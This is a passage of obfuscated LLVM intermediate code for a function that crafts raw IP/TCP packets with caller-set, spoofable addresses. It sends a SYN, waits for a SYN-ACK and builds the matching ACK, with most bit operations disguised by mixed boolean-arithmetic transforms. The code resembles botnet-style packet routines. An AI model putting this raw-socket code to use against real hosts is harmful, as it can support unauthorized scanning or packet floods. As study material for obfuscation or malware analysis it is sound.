  %15 = alloca i32, align 4
  %16 = alloca [40 x i8], align 16
  %17 = alloca [40 x i8], align 16
  %18 = alloca [512 x i8], align 16
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca %struct.sockaddr_in, align 4
  %22 = alloca i32, align 4
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i16 %0, i16* %7, align 2
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 64, i32* %12, align 4
  store i32 5, i32* %13, align 4
  store i32 4, i32* %14, align 4
  %30 = call i32 @rand_new()
  %31 = xor i32 %30, -1
  %32 = xor i32 65535, -1
  %33 = xor i32 1416951227, -1
  %34 = or i32 %31, %32
  %35 = or i32 1416951227, %33
  %36 = xor i32 %34, -1
  %37 = and i32 %36, %35
  %38 = and i32 %30, 65535
  store i32 %37, i32* %15, align 4
  %39 = bitcast [40 x i8]* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 40, i32 16, i1 false)
  %40 = bitcast [40 x i8]* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 40, i32 16, i1 false)
  %41 = bitcast [512 x i8]* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 512, i32 16, i1 false)
  store i32 0, i32* %22, align 4
  %42 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  %43 = bitcast i8* %42 to %struct.iphdr*
  store %struct.iphdr* %43, %struct.iphdr** %19, align 8
  %44 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %45 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %44, i64 1
  %46 = bitcast %struct.iphdr* %45 to %struct.tcphdr*
  store %struct.tcphdr* %46, %struct.tcphdr** %20, align 8
  %47 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %48 = bitcast %struct.iphdr* %47 to i8*
  %49 = load i8, i8* %48, align 4
  %50 = xor i8 -16, -1
  %51 = xor i8 %49, %50
  %52 = and i8 %51, %49
  %53 = and i8 %49, -16
  %54 = xor i8 %52, -1
  %55 = xor i8 5, -1
  %56 = xor i8 59, -1
  %57 = and i8 %54, 59
  %58 = and i8 %52, %56
  %59 = and i8 %55, 59
  %60 = and i8 5, %56
  %61 = or i8 %57, %58
  %62 = or i8 %59, %60
  %63 = xor i8 %61, %62
  %64 = or i8 %54, %55
  %65 = xor i8 %64, -1
  %66 = or i8 59, %56
  %67 = and i8 %65, %66
  %68 = or i8 %63, %67
  %69 = or i8 %52, 5
  store i8 %68, i8* %48, align 4
  %70 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %71 = bitcast %struct.iphdr* %70 to i8*
  %72 = load i8, i8* %71, align 4
  %73 = xor i8 %72, -1
  %74 = xor i8 15, -1
  %75 = xor i8 120, -1
  %76 = or i8 %73, %74
  %77 = or i8 120, %75
  %78 = xor i8 %76, -1
  %79 = and i8 %78, %77
  %80 = and i8 %72, 15
  %81 = and i8 %79, 64
  %82 = xor i8 %79, 64
  %83 = or i8 %81, %82
  %84 = or i8 %79, 64
  store i8 %83, i8* %71, align 4
  %85 = call zeroext i16 @htons(i16 zeroext 40) #9
  %86 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %87 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %86, i32 0, i32 2
  store i16 %85, i16* %87, align 2
  %88 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %89 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %88, i32 0, i32 5
  store i8 64, i8* %89, align 4
  %90 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %91 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %90, i32 0, i32 6
  store i8 6, i8* %91, align 1
  %92 = load i16, i16* %7, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #9
  %94 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %95 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %94, i32 0, i32 0
  %96 = bitcast %union.anon* %95 to %struct.anon.0*
  %97 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %96, i32 0, i32 1
  store i16 %93, i16* %97, align 2
  %98 = load i32, i32* %11, align 4
  %99 = trunc i32 %98 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #9
  %101 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon* %102 to %struct.anon.0*
  %104 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %103, i32 0, i32 0
  store i16 %100, i16* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon* %106 to %struct.anon.0*
  %108 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %107, i32 0, i32 4
  %109 = load i16, i16* %108, align 4
  %110 = xor i16 %109, -1
  %111 = xor i16 -241, -1
  %112 = xor i16 -24762, -1
  %113 = or i16 %110, %111
  %114 = or i16 -24762, %112
  %115 = xor i16 %113, -1
  %116 = and i16 %115, %114
  %117 = and i16 %109, -241
  %118 = xor i16 %116, -1
  %119 = xor i16 80, -1
  %120 = xor i16 19973, -1
  %121 = and i16 %118, 19973
  %122 = and i16 %116, %120
  %123 = and i16 %119, 19973
  %124 = and i16 80, %120
  %125 = or i16 %121, %122
  %126 = or i16 %123, %124
  %127 = xor i16 %125, %126
  %128 = or i16 %118, %119
  %129 = xor i16 %128, -1
  %130 = or i16 19973, %120
  %131 = and i16 %129, %130
  %132 = or i16 %127, %131
  %133 = or i16 %116, 80
  store i16 %132, i16* %108, align 4
  %134 = call i32 @rand_new()
  %135 = xor i32 %134, -1
  %136 = xor i32 65535, -1
  %137 = xor i32 254222829, -1
  %138 = or i32 %135, %136
  %139 = or i32 254222829, %137
  %140 = xor i32 %138, -1
  %141 = and i32 %140, %139
  %142 = and i32 %134, 65535
  %143 = trunc i32 %141 to i16
  %144 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon* %145 to %struct.anon.0*
  %147 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %146, i32 0, i32 5
  store i16 %143, i16* %147, align 2
  %148 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon* %149 to %struct.anon.0*
  %151 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = xor i16 -4097, -1
  %154 = xor i16 %152, %153
  %155 = and i16 %154, %152
  %156 = and i16 %152, -4097
  store i16 %155, i16* %151, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon* %158 to %struct.anon.0*
  %160 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = xor i16 -257, -1
  %163 = xor i16 %161, %162
  %164 = and i16 %163, %161
  %165 = and i16 %161, -257
  store i16 %164, i16* %160, align 4
  %166 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon* %167 to %struct.anon.0*
  %169 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %168, i32 0, i32 4
  %170 = load i16, i16* %169, align 4
  %171 = xor i16 %170, -1
  %172 = xor i16 -8193, -1
  %173 = xor i16 822, -1
  %174 = or i16 %171, %172
  %175 = or i16 822, %173
  %176 = xor i16 %174, -1
  %177 = and i16 %176, %175
  %178 = and i16 %170, -8193
  store i16 %177, i16* %169, align 4
  %179 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %180 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %179, i32 0, i32 0
  %181 = bitcast %union.anon* %180 to %struct.anon.0*
  %182 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %181, i32 0, i32 4
  %183 = load i16, i16* %182, align 4
  %184 = xor i16 %183, -1
  %185 = xor i16 -2049, -1
  %186 = xor i16 8651, -1
  %187 = or i16 %184, %185
  %188 = or i16 8651, %186
  %189 = xor i16 %187, -1
  %190 = and i16 %189, %188
  %191 = and i16 %183, -2049
  store i16 %190, i16* %182, align 4
  %192 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon* %193 to %struct.anon.0*
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = xor i16 %196, -1
  %198 = xor i16 -1025, -1
  %199 = xor i16 -19788, -1
  %200 = or i16 %197, %198
  %201 = or i16 -19788, %199
  %202 = xor i16 %200, -1
  %203 = and i16 %202, %201
  %204 = and i16 %196, -1025
  store i16 %203, i16* %195, align 4
  %205 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %206 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon* %206 to %struct.anon.0*
  %208 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %207, i32 0, i32 4
  %209 = load i16, i16* %208, align 4
  %210 = xor i16 -513, -1
  %211 = xor i16 %209, %210
  %212 = and i16 %211, %209
  %213 = and i16 %209, -513
  %214 = and i16 %212, 512
  %215 = xor i16 %212, 512
  %216 = or i16 %214, %215
  %217 = or i16 %212, 512
  store i16 %216, i16* %208, align 4
  %218 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon* %219 to %struct.anon.0*
  %221 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %220, i32 0, i32 3
  store i32 0, i32* %221, align 4
  %222 = call i32 @rand_new()
  %223 = xor i32 65535, -1
  %224 = xor i32 %222, %223
  %225 = and i32 %224, %222
  %226 = and i32 %222, 65535
  %227 = trunc i32 %225 to i16
  %228 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 3
  store i16 %227, i16* %229, align 4
  %230 = load i32, i32* %10, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 8
  store i32 %230, i32* %232, align 4
  %233 = load i32, i32* %9, align 4
  %234 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 9
  store i32 %233, i32* %235, align 4
  %236 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 7
  store i16 0, i16* %237, align 2
  %238 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %239 = bitcast %struct.iphdr* %238 to i16*
  %240 = call zeroext i16 @checksum_generic(i16* %239, i32 20)
  %241 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 7
  store i16 %240, i16* %242, align 2
  %243 = call i32 @rand_new()
  %244 = xor i32 65535, -1
  %245 = xor i32 %243, %244
  %246 = and i32 %245, %243
  %247 = and i32 %243, 65535
  %248 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %249 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %248, i32 0, i32 0
  %250 = bitcast %union.anon* %249 to %struct.anon.0*
  %251 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %250, i32 0, i32 2
  store i32 %246, i32* %251, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon* %253 to %struct.anon.0*
  %255 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %254, i32 0, i32 6
  store i16 0, i16* %255, align 4
  %256 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %257 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %258 = bitcast %struct.tcphdr* %257 to i8*
  %259 = call zeroext i16 @htons(i16 zeroext 20) #9
  %260 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %256, i8* %258, i16 zeroext %259, i32 20)
  %261 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %262 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %261, i32 0, i32 0
  %263 = bitcast %union.anon* %262 to %struct.anon.0*
  %264 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %263, i32 0, i32 6
  store i16 %260, i16* %264, align 4
  %265 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 0
  store i16 2, i16* %265, align 4
  %266 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %267 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %266, i32 0, i32 0
  %268 = bitcast %union.anon* %267 to %struct.anon.0*
  %269 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %268, i32 0, i32 1
  %270 = load i16, i16* %269, align 2
  %271 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 1
  store i16 %270, i16* %271, align 2
  %272 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %273 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %272, i32 0, i32 9
  %274 = load i32, i32* %273, align 4
  %275 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %21, i32 0, i32 2
  %276 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %275, i32 0, i32 0
  store i32 %274, i32* %276, align 4
  %277 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %278 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %277, i8* %278, i64 40, i32 16, i1 false)
  %279 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %280 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %279, i32 0, i32 0
  %281 = bitcast %union.anon* %280 to %struct.anon.0*
  %282 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %281, i32 0, i32 3
  %283 = load i32, i32* %282, align 4
  %284 = call i32 @ntohl(i32 %283) #9
  %285 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 0
  %287 = bitcast %union.anon* %286 to %struct.anon.0*
  %288 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %287, i32 0, i32 2
  %289 = load i32, i32* %288, align 4
  %290 = call i32 @ntohl(i32 %289) #9
  %291 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %284, i32 %290)
  %292 = load i32, i32* %8, align 4
  %293 = getelementptr inbounds [40 x i8], [40 x i8]* %16, i32 0, i32 0
  %294 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %295 = bitcast %struct.sockaddr_in* %21 to %struct.sockaddr*
  store %struct.sockaddr* %295, %struct.sockaddr** %294, align 8
  %296 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %297 = load %struct.sockaddr*, %struct.sockaddr** %296, align 8
  %298 = call i64 @sendto(i32 %292, i8* %293, i64 40, i32 16384, %struct.sockaddr* %297, i32 16)
  %299 = trunc i64 %298 to i32
  store i32 %299, i32* %22, align 4
  %300 = load i32, i32* %22, align 4
  %301 = icmp eq i32 %300, -1
  br i1 %301, label %302, label %303

; <label>:302:                                    ; preds = %5
  store i32 0, i32* %6, align 4
  br label %572

; <label>:303:                                    ; preds = %5
  %304 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i32 0, i32 0
  %305 = bitcast i8* %304 to %struct.iphdr*
  store %struct.iphdr* %305, %struct.iphdr** %19, align 8
  %306 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i64 1
  %308 = bitcast %struct.iphdr* %307 to %struct.tcphdr*
  store %struct.tcphdr* %308, %struct.tcphdr** %20, align 8
  store i32 0, i32* %24, align 4
  %309 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 5, i64* %309, align 8
  %310 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %310, align 8
  %311 = load i32, i32* %8, align 4
  %312 = bitcast %struct.timeval* %25 to i8*
  %313 = call i32 @setsockopt(i32 %311, i32 1, i32 20, i8* %312, i32 16) #8
  store i32 %313, i32* %22, align 4
  %314 = load i32, i32* %22, align 4
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %316, label %317

; <label>:316:                                    ; preds = %303
  store i32 0, i32* %6, align 4
  br label %572

; <label>:317:                                    ; preds = %303
  br label %318

; <label>:318:                                    ; preds = %561, %317
  %319 = load i32, i32* %24, align 4
  %320 = icmp slt i32 %319, 10000
  br i1 %320, label %321, label %568

; <label>:321:                                    ; preds = %318
  %322 = load i32, i32* %8, align 4
  %323 = getelementptr inbounds [512 x i8], [512 x i8]* %18, i32 0, i32 0
  %324 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %324, align 8
  %325 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %326 = load %struct.sockaddr*, %struct.sockaddr** %325, align 8
  %327 = call i64 @recvfrom(i32 %322, i8* %323, i64 512, i32 16384, %struct.sockaddr* %326, i32* null)
  %328 = trunc i64 %327 to i32
  store i32 %328, i32* %22, align 4
  %329 = load i32, i32* %22, align 4
  %330 = icmp eq i32 %329, -1
  br i1 %330, label %331, label %332

; <label>:331:                                    ; preds = %321
  br label %568

; <label>:332:                                    ; preds = %321
  %333 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %334 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %333, i32 0, i32 8
  %335 = load i32, i32* %334, align 4
  %336 = load i32, i32* %9, align 4
  %337 = icmp eq i32 %335, %336
  br i1 %337, label %338, label %561

; <label>:338:                                    ; preds = %332
  %339 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %340 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %339, i32 0, i32 0
  %341 = bitcast %union.anon* %340 to %struct.anon.0*
  %342 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %341, i32 0, i32 4
  %343 = load i16, i16* %342, align 4
  %344 = lshr i16 %343, 12
  %345 = xor i16 %344, -1
  %346 = xor i16 1, -1
  %347 = xor i16 17776, -1
  %348 = or i16 %345, %346
  %349 = or i16 17776, %347
  %350 = xor i16 %348, -1
  %351 = and i16 %350, %349
  %352 = and i16 %344, 1
  %353 = zext i16 %351 to i32
  %354 = icmp eq i32 %353, 1
  br i1 %354, label %355, label %561

; <label>:355:                                    ; preds = %338
  %356 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 0
  %358 = bitcast %union.anon* %357 to %struct.anon.0*
  %359 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %358, i32 0, i32 4
  %360 = load i16, i16* %359, align 4
  %361 = lshr i16 %360, 9
  %362 = xor i16 %361, -1
  %363 = xor i16 1, -1
  %364 = xor i16 -17554, -1
  %365 = or i16 %362, %363
  %366 = or i16 -17554, %364
  %367 = xor i16 %365, -1
  %368 = and i16 %367, %366
  %369 = and i16 %361, 1
  %370 = zext i16 %368 to i32
  %371 = icmp eq i32 %370, 1
  br i1 %371, label %372, label %561

; <label>:372:                                    ; preds = %355
  %373 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 0
  %375 = bitcast %union.anon* %374 to %struct.anon.0*
  %376 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %375, i32 0, i32 3
  %377 = load i32, i32* %376, align 4
  %378 = call i32 @ntohl(i32 %377) #9
  %379 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 0
  %381 = bitcast %union.anon* %380 to %struct.anon.0*
  %382 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %381, i32 0, i32 2
  %383 = load i32, i32* %382, align 4
  %384 = call i32 @ntohl(i32 %383) #9
  %385 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i32 0, i32 0), i32 %378, i32 %384)
  %386 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %387 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon* %387 to %struct.anon.0*
  %389 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %388, i32 0, i32 2
  %390 = load i32, i32* %389, align 4
  %391 = call i32 @ntohl(i32 %390) #9
  %392 = sub i32 0, %391
  %393 = sub i32 0, 1
  %394 = add i32 %392, %393
  %395 = sub i32 0, %394
  %396 = add i32 %391, 1
  %397 = call i32 @htonl(i32 %395) #9
  store i32 %397, i32* %27, align 4
  %398 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i32 0, i32 0
  %400 = bitcast %union.anon* %399 to %struct.anon.0*
  %401 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %400, i32 0, i32 3
  %402 = load i32, i32* %401, align 4
  store i32 %402, i32* %28, align 4
  %403 = getelementptr inbounds [40 x i8], [40 x i8]* %17, i32 0, i32 0
  %404 = bitcast i8* %403 to %struct.iphdr*
  store %struct.iphdr* %404, %struct.iphdr** %19, align 8
  %405 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %406 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %405, i64 1
  %407 = bitcast %struct.iphdr* %406 to %struct.tcphdr*
  store %struct.tcphdr* %407, %struct.tcphdr** %20, align 8
  %408 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 0
  %410 = bitcast %union.anon* %409 to %struct.anon.0*
  %411 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %410, i32 0, i32 4
  %412 = load i16, i16* %411, align 4
  %413 = xor i16 -4097, -1
  %414 = xor i16 %412, %413
  %415 = and i16 %414, %412
  %416 = and i16 %412, -4097
  %417 = xor i16 %415, -1
  %418 = xor i16 4096, -1
  %419 = xor i16 -16702, -1
  %420 = and i16 %417, -16702
  %421 = and i16 %415, %419
  %422 = and i16 %418, -16702
  %423 = and i16 4096, %419
  %424 = or i16 %420, %421
  %425 = or i16 %422, %423
  %426 = xor i16 %424, %425
  %427 = or i16 %417, %418
  %428 = xor i16 %427, -1
  %429 = or i16 -16702, %419
  %430 = and i16 %428, %429
  %431 = or i16 %426, %430
  %432 = or i16 %415, 4096
  store i16 %431, i16* %411, align 4
  %433 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 0
  %435 = bitcast %union.anon* %434 to %struct.anon.0*
  %436 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %435, i32 0, i32 4
  %437 = load i16, i16* %436, align 4
  %438 = xor i16 -257, -1
  %439 = xor i16 %437, %438
  %440 = and i16 %439, %437
  %441 = and i16 %437, -257
  store i16 %440, i16* %436, align 4
  %442 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 0
  %444 = bitcast %union.anon* %443 to %struct.anon.0*
  %445 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %444, i32 0, i32 4
  %446 = load i16, i16* %445, align 4
  %447 = xor i16 %446, -1
  %448 = xor i16 -8193, -1
  %449 = xor i16 -9838, -1
  %450 = or i16 %447, %448
  %451 = or i16 -9838, %449
  %452 = xor i16 %450, -1
  %453 = and i16 %452, %451
  %454 = and i16 %446, -8193
  store i16 %453, i16* %445, align 4
  %455 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 0
  %457 = bitcast %union.anon* %456 to %struct.anon.0*
  %458 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %457, i32 0, i32 4
  %459 = load i16, i16* %458, align 4
  %460 = xor i16 %459, -1
  %461 = xor i16 -2049, -1
  %462 = xor i16 9274, -1
  %463 = or i16 %460, %461
  %464 = or i16 9274, %462
  %465 = xor i16 %463, -1
  %466 = and i16 %465, %464
  %467 = and i16 %459, -2049
  store i16 %466, i16* %458, align 4
  %468 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 0
  %470 = bitcast %union.anon* %469 to %struct.anon.0*
  %471 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %470, i32 0, i32 4
  %472 = load i16, i16* %471, align 4
  %473 = xor i16 -1025, -1
  %474 = xor i16 %472, %473
  %475 = and i16 %474, %472
  %476 = and i16 %472, -1025
  store i16 %475, i16* %471, align 4
  %477 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %478 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %477, i32 0, i32 0
  %479 = bitcast %union.anon* %478 to %struct.anon.0*
  %480 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %479, i32 0, i32 4
  %481 = load i16, i16* %480, align 4
  %482 = xor i16 -513, -1
  %483 = xor i16 %481, %482
  %484 = and i16 %483, %481
  %485 = and i16 %481, -513
  store i16 %484, i16* %480, align 4
  %486 = load i32, i32* %27, align 4
  %487 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %488 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %487, i32 0, i32 0
  %489 = bitcast %union.anon* %488 to %struct.anon.0*
  %490 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %489, i32 0, i32 3
  store i32 %486, i32* %490, align 4
  %491 = load i32, i32* %28, align 4
  %492 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 0
  %494 = bitcast %union.anon* %493 to %struct.anon.0*
  %495 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %494, i32 0, i32 2
  store i32 %491, i32* %495, align 4
  %496 = call i32 @rand_new()
  %497 = xor i32 %496, -1
  %498 = xor i32 65535, -1
  %499 = xor i32 -1117644924, -1
  %500 = or i32 %497, %498
  %501 = or i32 -1117644924, %499
  %502 = xor i32 %500, -1
  %503 = and i32 %502, %501
  %504 = and i32 %496, 65535
  %505 = trunc i32 %503 to i16
  %506 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 3
  store i16 %505, i16* %507, align 4
  %508 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 7
  store i16 0, i16* %509, align 2
  %510 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %511 = bitcast %struct.iphdr* %510 to i16*
  %512 = call zeroext i16 @checksum_generic(i16* %511, i32 20)
  %513 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %514 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %513, i32 0, i32 7
  store i16 %512, i16* %514, align 2
  %515 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %516 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %515, i32 0, i32 0
  %517 = bitcast %union.anon* %516 to %struct.anon.0*
  %518 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %517, i32 0, i32 6
  store i16 0, i16* %518, align 4
  %519 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %520 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %521 = bitcast %struct.tcphdr* %520 to i8*
  %522 = call zeroext i16 @htons(i16 zeroext 20) #9
  %523 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %519, i8* %521, i16 zeroext %522, i32 20)
  %524 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
